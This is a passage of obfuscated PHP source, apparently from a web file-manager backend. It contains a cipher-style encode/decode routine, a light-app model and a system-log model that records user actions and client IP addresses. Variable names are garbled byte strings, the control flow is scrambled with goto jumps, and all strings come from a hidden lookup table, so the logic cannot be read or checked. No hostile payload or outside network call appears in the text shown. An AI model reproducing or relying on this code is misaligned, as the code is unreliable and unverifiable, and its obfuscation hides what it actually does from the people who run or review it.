md5(substr($eó¸ÜÜªÕÇ, 0, 16)); $c½¨•ÕÌ½ë = md5(substr($eó¸ÜÜªÕÇ, 16, 16)); $BÑ–™²è¾‚ = $BÑ–™²è¾‚ ? $BÑ–™²è¾‚ : md5(microtime()); goto a¸¿¨Ç§õ; F‡Êœ¦ÇŠÓ: for ($c•Çœöô‘‚ = 0; $c•Çœöô‘‚ <= 255; $c•Çœöô‘‚++) { $a¥¦ã²¬Íà[$c•Çœöô‘‚] = ord($e¦õŒâÂÍ[$c•Çœöô‘‚ % $c†ÔÙ°¥Ö]); } $D°³¼Šì· = range(0, 255); for ($dÙ ¨«ï‘ã = $c•Çœöô‘‚ = 0; $c•Çœöô‘‚ < 256; $c•Çœöô‘‚++) { $dÙ ¨«ï‘ã = ($dÙ ¨«ï‘ã + $D°³¼Šì·[$c•Çœöô‘‚] + $a¥¦ã²¬Íà[$c•Çœöô‘‚]) % 256; $c•ßêÁíãã = $D°³¼Šì·[$c•Çœöô‘‚]; $D°³¼Šì·[$c•Çœöô‘‚] = $D°³¼Šì·[$dÙ ¨«ï‘ã]; $D°³¼Šì·[$dÙ ¨«ï‘ã] = $c•ßêÁíãã; } goto F‡¤«®¨¾; a¸¿¨Ç§õ: $a®îµ»©í = substr($BÑ–™²è¾‚, -$eôÊ¤–á”); $e¦õŒâÂÍ = $B¼Úë¢Î¯ . md5($B¼Úë¢Î¯ . $a®îµ»©í); $c†ÔÙ°¥Ö = strlen($e¦õŒâÂÍ); goto B®£³†ˆˆ†; B®£³†ˆˆ†: $aÒ¾æÊ•¤­ = sprintf($Eªäõºì‡´[1925], $f¿´¤Ù† ? $f¿´¤Ù† + time() : 0) . substr(md5($aÒ¾æÊ•¤­ . $c½¨•ÕÌ½ë), 0, 16) . $aÒ¾æÊ•¤­; $DÎ¯¿ÃÌˆã = strlen($aÒ¾æÊ•¤­); $a¥¦ã²¬Íà = array(); goto F‡Êœ¦ÇŠÓ; F‡¤«®¨¾: $cõÓÅ‡øÃ = $Eªäõºì‡´[33]; for ($FŸ°â–Úá¹ = $dÙ ¨«ï‘ã = $c•Çœöô‘‚ = 0; $c•Çœöô‘‚ < $DÎ¯¿ÃÌˆã; $c•Çœöô‘‚++) { $FŸ°â–Úá¹ = ($FŸ°â–Úá¹ + 1) % 256; $dÙ ¨«ï‘ã = ($dÙ ¨«ï‘ã + $D°³¼Šì·[$FŸ°â–Úá¹]) % 256; $c•ßêÁíãã = $D°³¼Šì·[$FŸ°â–Úá¹]; $D°³¼Šì·[$FŸ°â–Úá¹] = $D°³¼Šì·[$dÙ ¨«ï‘ã]; $D°³¼Šì·[$dÙ ¨«ï‘ã] = $c•ßêÁíãã; $cõÓÅ‡øÃ .= chr(ord($aÒ¾æÊ•¤­[$c•Çœöô‘‚]) ^ $D°³¼Šì·[($D°³¼Šì·[$FŸ°â–Úá¹] + $D°³¼Šì·[$dÙ ¨«ï‘ã]) % 256]); } $cõÓÅ‡øÃ = $a®îµ»©í . str_replace($Eªäõºì‡´[901], $Eªäõºì‡´[33], base64_encode($cõÓÅ‡øÃ)); goto e¤•àãè¸; eº’”ïÄ¬ô: $Eªäõºì‡´ =& $_SERVER[îÖ]; $eôÊ¤–á” = 4; $eó¸ÜÜªÕÇ = md5($eó¸ÜÜªÕÇ ? $eó¸ÜÜªÕÇ : self::$defaultKey); goto F¤¼Ô¥“·í; e¤•àãè¸: $cõÓÅ‡øÃ = str_replace(array($Eªäõºì‡´[284], $Eªäõºì‡´[8], $Eªäõºì‡´[901]), array($Eªäõºì‡´[412], $Eªäõºì‡´[70], $Eªäõºì‡´[91]), $cõÓÅ‡øÃ); return $cõÓÅ‡øÃ; goto B«¤‹ÖÈ‰; B«¤‹ÖÈ‰: } public static function decode($fšÚ¶Š™«¦, $e”ß¯” ‡Ò = '') { goto f±»ÊáŸ‡ù; e÷´›ÇµÚ: $AœÁª¾„¥­ = substr($fšÚ¶Š™«¦, 0, $dùÏ…ï¸“¡); $Aë¯ãé¿¸é = $d®ñò®¥¿ . md5($d®ñò®¥¿ . $AœÁª¾„¥­); $fÑƒ¡ôÕÖ¦ = strlen($Aë¯ãé¿¸é); goto FÊÔ¹ìÛÕõ; EíŠˆ©«Ş»: if (($eÑŒŠ“Ñ¯‚ == 0 || $eÑŒŠ“Ñ¯‚ - time() > 0) && substr($E£èÃˆ¼‹–, 10, 16) == substr(md5(substr($E£èÃˆ¼‹–, 26) . $e·šéÏ©ê), 0, 16)) { return substr($E£èÃˆ¼‹–, 26); } else { return $fñßøÔ¤ò–[33]; } goto eÜÁŠ”«…˜; dæ–î±–™ê: $e”ß¯” ‡Ò = md5($e”ß¯” ‡Ò ? $e”ß¯” ‡Ò : self::$defaultKey); $d®ñò®¥¿ = md5(substr($e”ß¯” ‡Ò, 0, 16)); $e·šéÏ©ê = md5(substr($e”ß¯” ‡Ò, 16, 16)); goto e÷´›ÇµÚ; D²ß—ç¢ÛÆ: for ($A„ìƒ¯é±© = 0; $A„ìƒ¯é±© <= 255; $A„ìƒ¯é±©++) { $DøÇŞÍ‘ÎŠ[$A„ìƒ¯é±©] = ord($Aë¯ãé¿¸é[$A„ìƒ¯é±© % $fÑƒ¡ôÕÖ¦]); } $f£ÁÂ¨ĞÑÎ = range(0, 255); for ($dŠï›è·ìŞ = $A„ìƒ¯é±© = 0; $A„ìƒ¯é±© < 256; $A„ìƒ¯é±©++) { $dŠï›è·ìŞ = ($dŠï›è·ìŞ + $f£ÁÂ¨ĞÑÎ[$A„ìƒ¯é±©] + $DøÇŞÍ‘ÎŠ[$A„ìƒ¯é±©]) % 256; $cØé×½±§ç = $f£ÁÂ¨ĞÑÎ[$A„ìƒ¯é±©]; $f£ÁÂ¨ĞÑÎ[$A„ìƒ¯é±©] = $f£ÁÂ¨ĞÑÎ[$dŠï›è·ìŞ]; $f£ÁÂ¨ĞÑÎ[$dŠï›è·ìŞ] = $cØé×½±§ç; } goto E­­‚Î¯ë¿; E­­‚Î¯ë¿: $E£èÃˆ¼‹– = $fñßøÔ¤ò–[33]; for ($AÊê¾¬‹‹ö = $dŠï›è·ìŞ = $A„ìƒ¯é±© = 0; $A„ìƒ¯é±© < $DÒ‰Ø½ëÖ; $A„ìƒ¯é±©++) { $AÊê¾¬‹‹ö = ($AÊê¾¬‹‹ö + 1) % 256; $dŠï›è·ìŞ = ($dŠï›è·ìŞ + $f£ÁÂ¨ĞÑÎ[$AÊê¾¬‹‹ö]) % 256; $cØé×½±§ç = $f£ÁÂ¨ĞÑÎ[$AÊê¾¬‹‹ö]; $f£ÁÂ¨ĞÑÎ[$AÊê¾¬‹‹ö] = $f£ÁÂ¨ĞÑÎ[$dŠï›è·ìŞ]; $f£ÁÂ¨ĞÑÎ[$dŠï›è·ìŞ] = $cØé×½±§ç; $E£èÃˆ¼‹– .= chr(ord($fšÚ¶Š™«¦[$A„ìƒ¯é±©]) ^ $f£ÁÂ¨ĞÑÎ[($f£ÁÂ¨ĞÑÎ[$AÊê¾¬‹‹ö] + $f£ÁÂ¨ĞÑÎ[$dŠï›è·ìŞ]) % 256]); } $eÑŒŠ“Ñ¯‚ = intval(substr($E£èÃˆ¼‹–, 0, 10)); goto EíŠˆ©«Ş»; f±»ÊáŸ‡ù: $fñßøÔ¤ò– =& $_SERVER[îÖ]; $fšÚ¶Š™«¦ = str_replace(array($fñßøÔ¤ò–[412], $fñßøÔ¤ò–[70], $fñßøÔ¤ò–[91]), array($fñßøÔ¤ò–[284], $fñßøÔ¤ò–[8], $fñßøÔ¤ò–[901]), $fšÚ¶Š™«¦); $dùÏ…ï¸“¡ = 4; goto dæ–î±–™ê; FÊÔ¹ìÛÕõ: $fšÚ¶Š™«¦ = base64_decode(substr($fšÚ¶Š™«¦, $dùÏ…ï¸“¡)); $DÒ‰Ø½ëÖ = strlen($fšÚ¶Š™«¦); $DøÇŞÍ‘ÎŠ = array(); goto D²ß—ç¢ÛÆ; eÜÁŠ”«…˜: } } define($_SERVER[îÖ][1926], 1); define($_SERVER[îÖ][1927], 2); goto eà…ì…¶ôÒ; C‰‚¹”›°: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\x4c\x69\147\150\x74\101\x70\x70"; public $modelType = "\x53\x79\163\x74\x65\x6d\x4f\x70\164\x69\157\156"; public $field = array("\x6e\141\x6d\x65", "\x67\162\x6f\x75\x70", "\x64\145\163\x63", "\143\x6f\x6e\164\145\156\164"); public function listData($e‹¥¬ŸÑªÎ = false, $c´Ì´çĞ¤ì = "\155\x6f\x64\151\146\171\x54\x69\x6d\x65", $Dç¢×Øß›Å = true) { return parent::listData($e‹¥¬ŸÑªÎ, $c´Ì´çĞ¤ì, $Dç¢×Øß›Å); } public function remove($F•çã ‘ÂÙ) { $FŞâïµíõœ = $this->findByName($F•çã ‘ÂÙ); if (!$FŞâïµíõœ) { return !1; } return parent::remove($FŞâïµíõœ[$_SERVER[îÖ][367]]); } public function add($fğ‡ï¡ØÄã) { if ($this->findByName($fğ‡ï¡ØÄã[$_SERVER[îÖ][28]])) { return !1; } return parent::insert($fğ‡ï¡ØÄã); } public function update($F¬—ÑÈ©†, $EĞ¿âĞ×Ó›) { $dåµºÕ·›Ğ =& $_SERVER[îÖ]; $bµŸ½‹¥Äæ = $this->findByName($F¬—ÑÈ©†); $c‚…¬ÀˆÌ = $this->findByName($EĞ¿âĞ×Ó›[$dåµºÕ·›Ğ[28]]); if (!$bµŸ½‹¥Äæ || $c‚…¬ÀˆÌ && $c‚…¬ÀˆÌ[$dåµºÕ·›Ğ[367]] != $bµŸ½‹¥Äæ[$dåµºÕ·›Ğ[367]]) { return !1; } return parent::update($bµŸ½‹¥Äæ[$dåµºÕ·›Ğ[367]], $EĞ¿âĞ×Ó›); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\x6d\137\x6c\x6f\147"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\124\x69\155\145", "\164\x69\155\x65", "\151\x6e\163\145\162\x74", "\x66\x75\x6e\x63\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $DÇŒç§Åé =& $_SERVER[îÖ]; return array($DÇŒç§Åé[2377] => LNG($DÇŒç§Åé[2378]), $DÇŒç§Åé[2379] => LNG($DÇŒç§Åé[2380]), $DÇŒç§Åé[2038] => LNG($DÇŒç§Åé[2381]), $DÇŒç§Åé[2382] => LNG($DÇŒç§Åé[2383]), $DÇŒç§Åé[2384] => LNG($DÇŒç§Åé[2385]), $DÇŒç§Åé[2386] => LNG($DÇŒç§Åé[2387]), $DÇŒç§Åé[2388] => LNG($DÇŒç§Åé[2389]), $DÇŒç§Åé[2390] => LNG($DÇŒç§Åé[2391]), $DÇŒç§Åé[2069] => LNG($DÇŒç§Åé[2392]), $DÇŒç§Åé[2070] => LNG($DÇŒç§Åé[2393]), $DÇŒç§Åé[2394] => LNG($DÇŒç§Åé[2395]), $DÇŒç§Åé[2396] => LNG($DÇŒç§Åé[2397]), $DÇŒç§Åé[2398] => LNG($DÇŒç§Åé[2399]), $DÇŒç§Åé[2400] => LNG($DÇŒç§Åé[2401]), $DÇŒç§Åé[2067] => LNG($DÇŒç§Åé[2402]), $DÇŒç§Åé[2074] => LNG($DÇŒç§Åé[2403]), $DÇŒç§Åé[2404] => LNG($DÇŒç§Åé[2405]), $DÇŒç§Åé[2406] => LNG($DÇŒç§Åé[2407]), $DÇŒç§Åé[2408] => LNG($DÇŒç§Åé[2409]), $DÇŒç§Åé[2410] => LNG($DÇŒç§Åé[2411]), $DÇŒç§Åé[2077] => LNG($DÇŒç§Åé[2412]), $DÇŒç§Åé[2078] => LNG($DÇŒç§Åé[2413]), $DÇŒç§Åé[2414] => LNG($DÇŒç§Åé[2415]), $DÇŒç§Åé[2416] => LNG($DÇŒç§Åé[2417]), $DÇŒç§Åé[2418] => LNG($DÇŒç§Åé[2419]), $DÇŒç§Åé[2072] => LNG($DÇŒç§Åé[2420]), $DÇŒç§Åé[2421] => LNG($DÇŒç§Åé[2422]), $DÇŒç§Åé[2071] => LNG($DÇŒç§Åé[2423]), $DÇŒç§Åé[2424] => LNG($DÇŒç§Åé[2425]), $DÇŒç§Åé[2426] => LNG($DÇŒç§Åé[2427]), $DÇŒç§Åé[2428] => LNG($DÇŒç§Åé[2428]), $DÇŒç§Åé[2429] => LNG($DÇŒç§Åé[2042]), $DÇŒç§Åé[2430] => LNG($DÇŒç§Åé[2431]), $DÇŒç§Åé[2432] => LNG($DÇŒç§Åé[2433]), $DÇŒç§Åé[2434] => LNG($DÇŒç§Åé[2435]), $DÇŒç§Åé[2436] => LNG($DÇŒç§Åé[2437]), $DÇŒç§Åé[2438] => LNG($DÇŒç§Åé[2439]), $DÇŒç§Åé[2440] => LNG($DÇŒç§Åé[2440]), $DÇŒç§Åé[2441] => LNG($DÇŒç§Åé[2442]), $DÇŒç§Åé[2443] => LNG($DÇŒç§Åé[2444]), $DÇŒç§Åé[2445] => LNG($DÇŒç§Åé[2446]), $DÇŒç§Åé[2447] => LNG($DÇŒç§Åé[2448]), $DÇŒç§Åé[2449] => LNG($DÇŒç§Åé[2450]), $DÇŒç§Åé[2451] => LNG($DÇŒç§Åé[2452])); } private function typeFile() { $dÇœ…õ†œ© =& $_SERVER[îÖ]; $A¬µÒ¨å„ = array($dÇœ…õ†œ©[2074] => array($dÇœ…õ†œ©[2075]), $dÇœ…õ†œ©[2398] => array($dÇœ…õ†œ©[2453]), $dÇœ…õ†œ©[2400] => array($dÇœ…õ†œ©[2454]), $dÇœ…õ†œ©[2067] => array($dÇœ…õ†œ©[2068]), $dÇœ…õ†œ©[2406] => array(), $dÇœ…õ†œ©[2408] => array(), $dÇœ…õ†œ©[2410] => array(), $dÇœ…õ†œ©[2077] => array($dÇœ…õ†œ©[2079]), $dÇœ…õ†œ©[2078] => array($dÇœ…õ†œ©[2079]), $dÇœ…õ†œ©[2414] => array($dÇœ…õ†œ©[2455]), $dÇœ…õ†œ©[2416] => array($dÇœ…õ†œ©[2455]), $dÇœ…õ†œ©[2418] => array($dÇœ…õ†œ©[2456]), $dÇœ…õ†œ©[2404] => array($dÇœ…õ†œ©[2457]), $dÇœ…õ†œ©[2072] => array($dÇœ…õ†œ©[2458]), $dÇœ…õ†œ©[2421] => array($dÇœ…õ†œ©[2459]), $dÇœ…õ†œ©[2071] => array($dÇœ…õ†œ©[2073])); return $A¬µÒ¨å„; } private function typeAll() { goto bñš¤©ÁÂ¯; c„í¡ƒ•: foreach ($FÀî…Ü‚â„ as $cÈõ§¼ªè‘ => $bŠøø½““¦) { $b¯’ñËèåñ[$bŠøø½““¦[0]] = $b¯’ñËèåñ[$cÈõ§¼ªè‘]; } $b¯’ñËèåñ[$eÜ«œßï¸[2079]] = LNG($eÜ«œßï¸[2460]); $b¯’ñËèåñ[$eÜ«œßï¸[2455]] = LNG($eÜ«œßï¸[2461]); goto fÆ‡¤¹Ãƒá; fÆ‡¤¹Ãƒá: return $b¯’ñËèåñ; goto BƒĞŸ¾¡¿Ï; bñš¤©ÁÂ¯: $eÜ«œßï¸ =& $_SERVER[îÖ]; $b¯’ñËèåñ = $this->typeList; $FÀî…Ü‚â„ = array_filter($this->typeFile()); goto c„í¡ƒ•; BƒĞŸ¾¡¿Ï: } public function addLog($FÈÒ¶†ò‹, $e£çÕØ¹ = array()) { goto E°¦‹²Ğ¾Â; B“âæ”›Ô: $F•¼Ì‘ˆõ = get_client_ip(); if (!$e£çÕØ¹ || strlen(json_encode($e£çÕØ¹)) >= 1024) { $e£çÕØ¹ = array($a†í¥øÆµÄ[2462] => $F•¼Ì‘ˆõ); } else { if (is_array($e£çÕØ¹)) { $e£çÕØ¹[$a†í¥øÆµÄ[2462]] = $F•¼Ì‘ˆõ; } else { $e£çÕØ¹ = array($a†í¥øÆµÄ[1028] => $e£çÕØ¹, $a†í¥øÆµÄ[2462] => $F•¼Ì‘ˆõ); } } $e£çÕØ¹ = array($a†í¥øÆµÄ[1421] => Session::sign(), $a†í¥øÆµÄ[1422] => $fˆé«ÑÚÂ­, $a†í¥øÆµÄ[29] => $FÈÒ¶†ò‹, $a†í¥øÆµÄ[1424] => json_encode($e£çÕØ¹)); goto fß½¸ ±÷; E°¦‹²Ğ¾Â: $a†í¥øÆµÄ =& $_SERVER[îÖ]; if (!isset($this->typeList[$FÈÒ¶†ò‹])) { return; } $fˆé«ÑÚÂ­ = USER_ID ? USER_ID : (isset($e£çÕØ¹[$a†í¥øÆµÄ[1431]]) ? $e£çÕØ¹[$a†í¥øÆµÄ[1431]] : 0); goto B“âæ”›Ô; fß½¸ ±÷: parent::add($e£çÕØ¹); goto B¥á®¾¨ù; B¥á®¾¨ù: } public function remove($B¾ÁÈŞ®²Ï) { $this->where(array($_SERVER[îÖ][385] => $B¾ÁÈŞ®²Ï))->delete(); } private function _makeOrder($Fâª°ÚÍ = '') { goto AÔ°°ŒÀó†; AÔ°°ŒÀó†: $D‡ğàÅ­°¾ =& $_SERVER[îÖ]; $dÓ†Å¥‰Ê = $D‡ğàÅ­°¾[187]; $fÙ ÷ø´¼Ì = array($D‡ğàÅ­°¾[402] => $D‡ğàÅ­°¾[403], $D‡ğàÅ­°¾[404] => $D‡ğàÅ­°¾[405]); goto BòÁ®áöí¹; BòÁ®áöí¹: $a›ˆ„Ö•Ùà = Input::get($D‡ğàÅ­°¾[408], $D‡ğàÅ­°¾[7], $D‡ğàÅ­°¾[2240], array($D‡ğàÅ­°¾[2176], $D‡ğàÅ­°¾[404])); $a›ˆ„Ö•Ùà = $fÙ ÷ø´¼Ì[$a›ˆ„Ö•Ùà]; $Fâª°ÚÍ = $Fâª°ÚÍ . "{$dÓ†Å¥‰Ê}\40{$a›ˆ„Ö•Ùà}"; goto CçƒØ¾íáÀ; CçƒØ¾íáÀ: return $this->order($Fâª°ÚÍ); goto aá¨µÌ­; aá¨µÌ­: } public function get($cÈ’ÎŠ‡Ë = '') { goto Fï²²é®Ûê; bïŸ³›ÀÓï: $D›œÀ‡§¾[$b­Øƒ×ğ÷ø[354]] = $this->logList($D›œÀ‡§¾[$b­Øƒ×ğ÷ø[354]]); return $D›œÀ‡§¾; goto B±ßĞõ×Í; cîë¿«¥™: if (!empty($cÈ’ÎŠ‡Ë[$b­Øƒ×ğ÷ø[2462]])) { $E¶Ó³‹ˆ±ö[$b­Øƒ×ğ÷ø[405]] = array($b­Øƒ×ğ÷ø[751], "\45{$cÈ’ÎŠ‡Ë[$b­Øƒ×ğ÷ø[2462]]}\45"); } $D›œÀ‡§¾ = $this->_makeOrder()->where($E¶Ó³‹ˆ±ö)->selectPage(); if (empty($D›œÀ‡§¾[$b­Øƒ×ğ÷ø[354]])) { show_json(array(), !0, $D›œÀ‡§¾[$b­Øƒ×ğ÷ø[351]]); } goto bïŸ³›ÀÓï; Fï²²é®Ûê: $b­Øƒ×ğ÷ø =& $_SERVER[îÖ]; if (!$cÈ’ÎŠ‡Ë) { show_json(array()); } $E¶Ó³‹ˆ±ö = array(); goto A£ì¤êí‘æ; A£ì¤êí‘æ: if ($cÈ’ÎŠ‡Ë[$b­Øƒ×ğ÷ø[1431]]) { $E¶Ó³‹ˆ±ö[$b­Øƒ×ğ÷ø[1431]] = $cÈ’ÎŠ‡Ë[$b­Øƒ×ğ÷ø[1431]]; } if (isset($cÈ’ÎŠ‡Ë[$b­Øƒ×ğ÷ø[701]])) { $Eì«ì­çøó = $cÈ’ÎŠ‡Ë[$b­Øƒ×ğ÷ø[701]]; $f…†˜ğèĞ = isset($cÈ’ÎŠ‡Ë[$b­Øƒ×ğ÷ø[702]]) ? $cÈ’ÎŠ‡Ë[$b­Øƒ×ğ÷ø[702]] : time(); $E¶Ó³‹ˆ±ö[$b­Øƒ×ğ÷ø[187]] = array($b­Øƒ×ğ÷ø[321], array($Eì«ì­çøó, $f…†˜ğèĞ)); } if ($cÈ’ÎŠ‡Ë[$b­Øƒ×ğ÷ø[29]]) { $bè¿ºÕš = explode($b­Øƒ×ğ÷ø[47], $cÈ’ÎŠ‡Ë[$b­Øƒ×ğ÷ø[29]]); $BĞƒŞ¦õ… = $this->typeFile(); $c«¿×Ù²²… = array(); foreach ($bè¿ºÕš as $Fà‰¢Ç”¾Ù) { $c«¿×Ù²²…[] = $Fà‰¢Ç”¾Ù; if (isset($BĞƒŞ¦õ…[$Fà‰¢Ç”¾Ù])) { $c«¿×Ù²²… = array_merge($c«¿×Ù²²…, $BĞƒŞ¦õ…[$Fà‰¢Ç”¾Ù]); } } $c«¿×Ù²²… = array_unique($c«¿×Ù²²…); if ($c«¿×Ù²²…) { $E¶Ó³‹ˆ±ö[$b­Øƒ×ğ÷ø[29]] = array($b­Øƒ×ğ÷ø[7], $c«¿×Ù²²…); } } goto cîë¿«¥™; B±ßĞõ×Í: } private function ipAddress(&$A‘®ÂÏ÷›÷) { $Eëõ®Õğ£‹ =& $_SERVER[îÖ]; if (!empty($A‘®ÂÏ÷›÷[$Eëõ®Õğ£‹[2462]])) { $fó‹²‘ù– = IpLocation::get($A‘®ÂÏ÷›÷[$Eëõ®Õğ£‹[2462]]); } else { $fó‹²‘ù– = LNG($Eëõ®Õğ£‹[2463]); } $A‘®ÂÏ÷›÷[$Eëõ®Õğ£‹[2464]] = $fó‹²‘ù–; } private function descZipDownload($Bªâ¶‘ÚÏí, &$Bø •³¡°å) { $DîŸ„šÃ =& $_SERVER[îÖ]; if (!isset($Bªâ¶‘ÚÏí[$DîŸ„šÃ[2465]])) { return; } $f‰…‘ ×¿É = json_decode($Bªâ¶‘ÚÏí[$DîŸ„šÃ[2465]], !0); foreach ($f‰…‘ ×¿É as $f”„„³Ğ¨Õ) { if (!IO::init($f”„„³Ğ¨Õ[$DîŸ„šÃ[75]])) { continue; } if (!($bÌ‰Ö•Ø…Ü = IO::infoFull($f”„„³Ğ¨Õ[$DîŸ„šÃ[75]]))) { continue; } $Bªâ¶‘ÚÏí[$DîŸ„šÃ[75]] = $f”„„³Ğ¨Õ[$DîŸ„šÃ[75]]; $Bø •³¡°å[] = $Bªâ¶‘ÚÏí[$DîŸ„šÃ[369]] = $bÌ‰Ö•Ø…Ü[$DîŸ„šÃ[369]]; $Bø •³¡°å[] = $Bªâ¶‘ÚÏí[$DîŸ„šÃ[2283]] = $bÌ‰Ö•Ø…Ü[$DîŸ„šÃ[461]]; break; } return $Bªâ¶‘ÚÏí; } private function getSourceList(&$dù‘¦ÑŞ¢) { $C´•›±ôö =& $_SERVER[îÖ]; $Eïˆ‹†å§É = array(); foreach ($dù‘¦ÑŞ¢ as $E•×¡”•â¯ => $eÚÃï½Ê’ª) { goto aœÌ¡Ã½»‚; FëŞ“ÖÓÒ: $Eïˆ‹†å§É[] = $aØ­ò‡Ï¨ô[$C´•›±ôö[369]]; $Eïˆ‹†å§É[] = $aØ­ò‡Ï¨ô[$C´•›±ôö[2283]]; if ($aØ­ò‡Ï¨ô[$C´•›±ôö[29]] == $C´•›±ôö[492]) { $Eïˆ‹†å§É[] = $aØ­ò‡Ï¨ô[$C´•›±ôö[405]][$C´•›±ôö[1001]]; $Eïˆ‹†å§É[] = $aØ­ò‡Ï¨ô[$C´•›±ôö[405]][$C´•›±ôö[1002]]; } goto DŒõ©åñ³ƒ; aœÌ¡Ã½»‚: $aØ­ò‡Ï¨ô = json_decode($eÚÃï½Ê’ª[$C´•›±ôö[405]], !0); if ($eÚÃï½Ê’ª[$C´•›±ôö[29]] == $C´•›±ôö[2070]) { $aØ­ò‡Ï¨ô = $this->descZipDownload($aØ­ò‡Ï¨ô, $Eïˆ‹†å§É); $dù‘¦ÑŞ¢[$E•×¡”•â¯][$C´•›±ôö[405]] = json_encode($aØ­ò‡Ï¨ô); continue; } if (strpos($eÚÃï½Ê’ª[$C´•›±ôö[29]], $C´•›±ôö[2284]) !== 0) { goto Dğ¾×–¾µª; aˆ…ƒ¼ÖÔ: $Eïˆ‹†å§É[] = $aØ­ò‡Ï¨ô[$C´•›±ôö[369]] = $c¡ä’ß–å‰[$C´•›±ôö[369]]; $Eïˆ‹†å§É[] = $aØ­ò‡Ï¨ô[$C´•›±ôö[2283]] = $c¡ä’ß–å‰[$C´•›±ôö[461]]; $dù‘¦ÑŞ¢[$E•×¡”•â¯][$C´•›±ôö[405]] = json_encode($aØ­ò‡Ï¨ô); goto D»ËìĞÌ¬ª; Dğ¾×–¾µª: if (!isset($aØ­ò‡Ï¨ô[$C´•›±ôö[75]]) || strpos($eÚÃï½Ê’ª[$C´•›±ôö[29]], $C´•›±ôö[2466]) !== 0) { continue; } if (!IO::init($aØ­ò‡Ï¨ô[$C´•›±ôö[75]])) { continue; } if (!($c¡ä’ß–å‰ = IO::infoFull($aØ­ò‡Ï¨ô[$C´•›±ôö[75]]))) { continue; } goto aˆ…ƒ¼ÖÔ; D»ËìĞÌ¬ª: continue; goto BÃâ¡ÎÃçÙ; BÃâ¡ÎÃçÙ: } goto FëŞ“ÖÓÒ; DŒõ©åñ³ƒ: if ($aØ­ò‡Ï¨ô[$C´•›±ôö[29]] == $C´•›±ôö[2291]) { $Eïˆ‹†å§É[] = $aØ­ò‡Ï¨ô[$C´•›±ôö[405]][$C´•›±ôö[369]]; } goto D”‡â®‡‹ˆ; D”‡â®‡‹ˆ: } if (!$Eïˆ‹†å§É) { return array(); } return Model($C´•›±ôö[752])->sourceListInfo($Eïˆ‹†å§É, !0); } private function logList($CÑ»ÄÓ“Û“) { goto dËÕ½‘â—Ë; d–¹ù¹Ğ¢: return $CåŞƒƒà˜; goto fÙŠ•ŠÈ›©; dËÕ½‘â—Ë: $DêÌÂ›¼ù¤ =& $_SERVER[îÖ]; $BˆÍÊ›ß˜À = array_to_keyvalue($CÑ»ÄÓ“Û“, $DêÌÂ›¼ù¤[33], $DêÌÂ›¼ù¤[1431]); $aÇ‚‰â¯£ã = Model($DêÌÂ›¼ù¤[477])->userListInfo(array_unique($BˆÍÊ›ß˜À)); goto AôâŠ¦êİÓ; AôâŠ¦êİÓ: $F¡¶„®†ÁÌ = $this->getSourceList($CÑ»ÄÓ“Û“); $cÇô¾ÇÈˆ› = $this->typeAll(); $CåŞƒƒà˜ = array(); goto eİ™²„¡ƒø; eİ™²„¡ƒø: $D˜ßî„È“· = array(); foreach ($CÑ»ÄÓ“Û“ as $f¸ãÀˆÃ¶ƒ => $d¡ åÖ‘Ş) { goto DÏó¸İ‡—é; DÛÖŠå¯Çƒ: unset($d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[2469]]); $CåŞƒƒà˜[] = $d¡ åÖ‘Ş; goto E‡Œò‰ç„˜; EÂ£‡‹„×: $d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[2239]] = $cà¾ø¹²Å; $b·ÊÂæ¥ = json_decode($d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[405]], !0); $d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[2462]] = isset($b·ÊÂæ¥[$DêÌÂ›¼ù¤[2462]]) ? $b·ÊÂæ¥[$DêÌÂ›¼ù¤[2462]] : $DêÌÂ›¼ù¤[33]; goto B£›±éˆ„Ÿ; F¥Åá’Ï‚º: $d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[28]] = isset($cà¾ø¹²Å[$DêÌÂ›¼ù¤[28]]) ? $cà¾ø¹²Å[$DêÌÂ›¼ù¤[28]] : LNG($DêÌÂ›¼ù¤[2463]); $d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[2331]] = isset($cà¾ø¹²Å[$DêÌÂ›¼ù¤[2331]]) ? $cà¾ø¹²Å[$DêÌÂ›¼ù¤[2331]] : $DêÌÂ›¼ù¤[33]; $d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[1337]] = isset($cÇô¾ÇÈˆ›[$BŸÈ‡ÉÔ³ø]) ? $cÇô¾ÇÈˆ›[$BŸÈ‡ÉÔ³ø] : $BŠ“ ™­¿Ö; goto EÂ£‡‹„×; B£›±éˆ„Ÿ: $this->ipAddress($d¡ åÖ‘Ş); if (strpos($BŸÈ‡ÉÔ³ø, $DêÌÂ›¼ù¤[2284]) === 0 || isset($b·ÊÂæ¥[$DêÌÂ›¼ù¤[2283]])) { goto Fğ‰—­ÙµÌ; B÷Ûˆİïñ‡: if ($b·ÊÂæ¥[$DêÌÂ›¼ù¤[29]] == $DêÌÂ›¼ù¤[2291]) { $b·ÊÂæ¥[$DêÌÂ›¼ù¤[405]][$DêÌÂ›¼ù¤[369]] = $F¡¶„®†ÁÌ[$b·ÊÂæ¥[$DêÌÂ›¼ù¤[405]][$DêÌÂ›¼ù¤[369]]]; } if ($b·ÊÂæ¥[$DêÌÂ›¼ù¤[29]] == $DêÌÂ›¼ù¤[2065]) { $b·ÊÂæ¥[$DêÌÂ›¼ù¤[2296]] = $b·ÊÂæ¥[$DêÌÂ›¼ù¤[391]]; $b·ÊÂæ¥[$DêÌÂ›¼ù¤[2283]] = $b·ÊÂæ¥[$DêÌÂ›¼ù¤[2296]][$DêÌÂ›¼ù¤[369]]; $b·ÊÂæ¥[$DêÌÂ›¼ù¤[391]] = !1; $b·ÊÂæ¥[$DêÌÂ›¼ù¤[369]] = $DêÌÂ›¼ù¤[33]; } if ($b·ÊÂæ¥[$DêÌÂ›¼ù¤[391]] && $b·ÊÂæ¥[$DêÌÂ›¼ù¤[391]][$DêÌÂ›¼ù¤[371]] == $DêÌÂ›¼ù¤[1074]) { $D˜ßî„È“·[] = $d¡ åÖ‘Ş[$DêÌÂ›¼ù¤[367]]; unset($CÑ»ÄÓ“Û“[$f¸ãÀˆÃ¶ƒ]); continue; } goto a‰ƒ¼óùº¨; Fğ‰—­ÙµÌ: 